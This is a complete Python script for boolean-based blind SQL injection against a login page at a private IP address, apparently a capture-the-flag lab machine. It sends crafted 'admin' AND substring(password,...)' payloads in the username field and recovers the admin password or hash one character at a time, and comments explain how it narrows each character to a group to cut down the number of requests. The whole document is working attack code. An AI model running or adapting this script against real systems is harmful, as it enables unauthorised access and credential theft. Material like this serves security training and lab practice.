import requests
"""
The first check is to find if the character in X position is an alphabet or not. If so, it is checked if it belongs to [a-f] group or the rest. If it’s a hash, it’ll always belong to a-f group which is “alpha1” in the below code.
If it’s not an alphabet, it’s checked if the number belongs to [0-4] group or [5-9].
Once the group is sent back, SQLstring is used to generate payloads for characters in only those groups for X position. This reduces the amount of requests sent to the server, and we extract the hash much faster.

These checks are done using “ord”. Ordinal numbers are just decimal numbers. We convert the output of the substring to ord and perform a check if it’s greater than 58, ascii(9) = decimal(57), thus checking if the character in that position is an alphabet.
"""



def SQLstring(i,c):
    # We only want 1 password character at a time
    # Final payload will look like
    # username=admin'+AND+substring(password,1,1)='a'--+-&password=noobsec
    return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


def SQLsplit(i):
    # Checking if the character is an alphabet
    sql = "admin' AND ord(substring(password,%s,1)) > '58'-- -" % i
    payload = {'username':sql, 'password':'noobsec'}
    r = requests.post('http://10.10.10.73/login.php', data=payload)
    if "Wrong identification" in r.text:
    # Checking if it's beyond "f"
        sql = "admin' AND ord(substring(password,%s,1)) > '102'-- -" % i
        payload = {'username':sql, 'password':'noobsec'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            return "alpha2"
        else:
        # If not beyond "f"
            return "alpha1"
    # Character is a number
    else:
    # Checking if number is less than "5"
        sql = "admin' AND ord(substring(password,%s,1)) < '53'-- -" % i
        payload = {'username':sql, 'password':'noobsec'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            return "num1"
        else:
        # If number is greater than 5
            return "num2"


# password could be in hashed format or plaintext
alpha1 = 'abcdef'
alpha2 = 'ghijklmnopqrstuvwxyz'
num1 = '01234'
num2 = '56789'

# Password variable
passwd = ''

for i in range(1,33):
    if SQLsplit(i) == "alpha1":
        for a in alpha1:
            payload = {'username':SQLstring(i,a), 'password':'noobsec'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += a
                print(a,end='',flush=True)
                break

    elif SQLsplit(i) == "alpha2":
        for a in alpha2:
            payload = {'username':SQLstring(i,a), 'password':'noobsec'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += a
                print(a,end='',flush=True)
                break
            
    elif SQLsplit(i) == "num1":
        for n in num1:
            payload = {'username':SQLstring(i,n), 'password':'noobsec'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += n
                print(n,end='',flush=True)
                break

    
    else:
        for n in num2:
            payload = {'username':SQLstring(i,n), 'password':'noobsec'}
            r = requests.post('http://10.10.10.73/login.php',data=payload)
            if "Wrong identification" in r.text:
                passwd += n
                print(n,end='',flush=True)
                break


# print('\n')
print('\nPassword or Hash is:\t'+passwd+'\n')